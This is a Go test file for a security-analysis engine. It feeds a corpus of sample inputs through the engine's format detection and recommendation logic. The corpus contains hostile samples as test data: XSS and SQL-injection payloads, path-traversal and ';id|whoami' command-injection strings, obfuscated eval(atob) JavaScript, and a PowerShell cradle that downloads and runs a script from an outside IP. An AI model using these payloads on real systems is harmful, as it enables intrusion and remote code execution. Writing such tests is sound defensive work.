package engine

import (
	"strings"
	"testing"

	"github.com/grcheulishvili/advsec/pkg/osdetect"
	"github.com/grcheulishvili/advsec/pkg/plugin"
)

// fuzzSample is one real-world-style payload plus the invariants it must honor.
type fuzzSample struct {
	name       string
	body       string
	wantFormat Format   // "" = don't assert
	suppressed []string // domains that must NOT appear in recommendations
	noIntent   bool     // true = intent must be IntentNone
}

// fuzzCorpus mirrors the /tmp/advsec_fuzz samples used for autonomous fuzzing,
// embedded here so the oracle runs deterministically in CI.
func fuzzCorpus() []fuzzSample {
	return []fuzzSample{
		{
			name:       "path-list",
			body:       "anaconda.xlog\n/var/log/auth.log\n/var/log/syslog\n/var/log/messages\n/proc/self/environ\n/etc/shadow\n",
			wantFormat: FormatPathList,
			suppressed: []string{"network", "redteam", "cloud", "wireless", "pwn", "reversing"},
			noIntent:   true,
		},
		{
			name:       "extension-list",
			body:       "config.php\nindex.js\nnotes.md\nbackup.bak\nsettings.conf\ndata.xlog\narchive.7z\nreport.txt\n",
			suppressed: []string{"network", "redteam", "cloud", "wireless"},
			noIntent:   true,
		},
		{
			name:       "payload-cheatsheet",
			body:       "<script>alert(document.cookie)</script>\n<img src=x onerror=alert(1)>\n' OR '1'='1' --\nadmin' UNION SELECT u,p FROM users--\n../../../../etc/passwd\n%2e%2e%2fetc%2fpasswd\n{{7*7}}\n;id|whoami\n",
			wantFormat: FormatPayloadList,
			suppressed: []string{"network", "redteam", "cloud", "wireless", "pwn", "reversing"},
			noIntent:   true,
		},
		{
			name:       "wordlist",
			body:       "admin\nroot\npassword\nletmein\nadministrator\nbackup\ntest\nguest\nsecret\nqwerty\n",
			wantFormat: FormatWordlist,
			suppressed: []string{"network", "redteam", "cloud", "wireless", "pwn", "reversing"},
			noIntent:   true,
		},
		{
			name:       "obfuscated-js",
			body:       "var _0x4a2b=['log','cookie'];\n(function(){window[_0x4a2b[0]];})();\neval(atob('ZG9j'));document.cookie;new Function('return this')();\n",
			wantFormat: FormatJavaScript,
			suppressed: []string{"network", "redteam", "cloud", "wireless"},
		},
		{
			name:       "powershell-cradle",
			body:       "$env:TEMP\npowershell -nop -w hidden -EncodedCommand ZwBlAHQA\nIEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')\n[System.Convert]::FromBase64String($p)\n",
			wantFormat: FormatPowerShell,
			suppressed: []string{"web", "wireless", "cloud"},
		},
		{
			name:       "nmap-output",
			body:       "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for shop.victim.test (203.0.113.10)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n443/tcp open  https\n| Subject Alternative Name: DNS:shop.victim.test, DNS:*.victim.test\n",
			wantFormat: FormatNmap,
			suppressed: []string{"wireless", "mobile"},
		},
		{
			name:       "http-headers",
			body:       "HTTP/1.1 200 OK\nServer: Apache/2.4.58\nX-Powered-By: PHP/8.2.1\nSet-Cookie: PHPSESSID=abc123; path=/\nContent-Type: text/html; charset=UTF-8\n",
			suppressed: []string{"wireless", "mobile", "redteam"}, // HTTP/1.1 must not look like a Kerberos SPN
		},
		{
			name:       "ssh-bruteforce-log",
			body:       "Oct 06 10:00:01 host sshd[1]: Failed password for root from 203.0.113.9 port 4444 ssh2\nOct 06 10:00:02 host sshd[2]: Failed password for root from 203.0.113.9 port 4445 ssh2\nOct 06 10:00:03 host sshd[3]: Failed password for admin from 203.0.113.9 port 4446 ssh2\n",
			wantFormat: FormatLog,
			suppressed: []string{"pwn", "reversing", "wireless"},
		},
		{
			name:       "setup-script-gpg",
			body:       "#!/bin/sh\nset -e\nsudo pacman-key --init\nsudo pacman-key --recv-keys 4345771566D76038C7FEB43863EC0ADBEA87E4E3\n",
			wantFormat: FormatShell,
			suppressed: []string{"wireless"},
		},
		{
			name:       "email-mime",
			body:       "Received: from mx.evil-sender.test\nFrom: ceo@victim.test\nSubject: Urgent wire transfer\nMIME-Version: 1.0\nAuthentication-Results: spf=fail; dkim=fail; dmarc=fail\nContent-Disposition: attachment; filename=\"invoice.docm\"\n",
			wantFormat: FormatEmail,
			suppressed: []string{"network", "redteam", "cloud", "wireless", "pwn", "reversing"},
		},
		{
			name:       "file-elf-description",
			body:       "suspicious.bin: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped, with executable stack\n",
			wantFormat: FormatELF,
			suppressed: []string{"web", "cloud", "eml", "wireless"}, // "executable" must not match BLE
		},
		{
			name:       "crash-dump",
			body:       "Program received signal SIGSEGV, Segmentation fault.\n0x00007ffff7a0d1c2 in __libc_start_main ()\nrax 0x0 rip 0x00005555555551c9 rsp 0x7fffffffe2a0\n#0  0x00005555555551c9 in vuln ()\n",
			suppressed: []string{"wireless", "cloud"},
		},
	}
}

// TestPayloadList_NoArchiveLeakage ensures a plain-text payload list (even one
// whose lines mention ".zip"/"tar.gz") never surfaces archive extraction tools.
func TestPayloadList_NoArchiveLeakage(t *testing.T) {
	plugins := plugin.LoadFromDirs([]string{"../../plugins"}).Plugins
	in := "<script>alert(1)</script>\n' OR '1'='1' --\n../../../etc/passwd\nbackup.tar.gz\nsite.zip\nadmin\npassword\n"
	ctx := ParseString(in)
	if ctx.Format != FormatPayloadList {
		t.Fatalf("format = %q, want text/payload_list", ctx.Format)
	}
	scoped := FilterByFormat(plugins, ctx.Format)
	matches := NewMatcher(scoped).Evaluate(ctx)
	report := NewEvaluator(fuzzHost()).Evaluate(ctx, matches)
	for _, rec := range report.Recommendations {
		if rec.Domain == "archive" || strings.Contains(strings.ToLower(rec.PluginID), "archive") {
			t.Errorf("archive plugin %q leaked into payload list", rec.PluginID)
		}
		for _, tool := range rec.Tools {
			for _, bad := range []string{"7z ", "7za ", "tar tf", "tar xf", "unzip", "unrar"} {
				if strings.Contains(tool.Command, bad) {
					t.Errorf("archive command %q leaked (tool %q, rule %s)", bad, tool.Name, rec.PluginID)
				}
			}
		}
	}
}

func fuzzHost() osdetect.HostInfo {
	return osdetect.HostInfo{Family: osdetect.FamilyDebian,
		Manager: osdetect.PackageManager{Name: "apt", InstallTemplate: "sudo apt install -y %s"}}
}

var fuzzBadSuffix = []string{".txt", ".xlog", ".log", ".php", ".js", ".md",
	".bak", ".conf", ".7z", ".bin", ".ps1", ".sh", ".exe"}
var fuzzVendors = []string{"nmap.org", "github.com", "virustotal.com", "censys.io", "shodan.io"}

// TestFuzzCorpus is the embedded autonomous-fuzzing oracle: it runs every
// real-world sample through the full engine and enforces the six logical
// invariants (no domain hallucination, correct format, no absurd/suppressed
// recommendations, no placeholder leak, no vendor-link extraction, no false
// intent inference).
func TestFuzzCorpus(t *testing.T) {
	plugins := plugin.LoadFromDirs([]string{"../../plugins"}).Plugins
	for _, s := range fuzzCorpus() {
		t.Run(s.name, func(t *testing.T) {
			ctx := ParseString(s.body)
			scoped := FilterByFormat(plugins, ctx.Format)
			matches := NewMatcher(scoped).Evaluate(ctx)
			kept := matches[:0]
			for _, m := range matches {
				if m.Confidence >= DefaultMinConfidence {
					kept = append(kept, m)
				}
			}
			report := NewEvaluator(fuzzHost()).Evaluate(ctx, kept)

			if s.wantFormat != "" && ctx.Format != s.wantFormat {
				t.Errorf("format = %q, want %q", ctx.Format, s.wantFormat)
			}
			// Domain hallucination + vendor leakage.
			for _, d := range ctx.Entities[EntityDomain] {
				for _, suf := range fuzzBadSuffix {
					if strings.HasSuffix(d, suf) {
						t.Errorf("domain hallucination: %q ends with %q", d, suf)
					}
				}
				for _, v := range fuzzVendors {
					if d == v || strings.HasSuffix(d, "."+v) {
						t.Errorf("vendor host extracted as domain: %q", d)
					}
				}
			}
			for _, u := range ctx.Entities[EntityURL] {
				for _, v := range fuzzVendors {
					if strings.Contains(u, v) {
						t.Errorf("vendor URL extracted: %q", u)
					}
				}
			}
			// Suppressed domains + placeholder leakage.
			supp := map[string]bool{}
			for _, d := range s.suppressed {
				supp[d] = true
			}
			for _, rec := range report.Recommendations {
				if supp[rec.Domain] {
					t.Errorf("absurd recommendation: domain %q (%s) for %s", rec.Domain, rec.PluginID, s.name)
				}
				for _, tool := range rec.Tools {
					assertNoRawPlaceholder(t, tool.Command, rec.PluginID)
				}
			}
			// False intent inference.
			if s.noIntent && InferIntent(ctx) != IntentNone {
				t.Errorf("unexpected intent %q inferred for %s", InferIntent(ctx), s.name)
			}
		})
	}
}
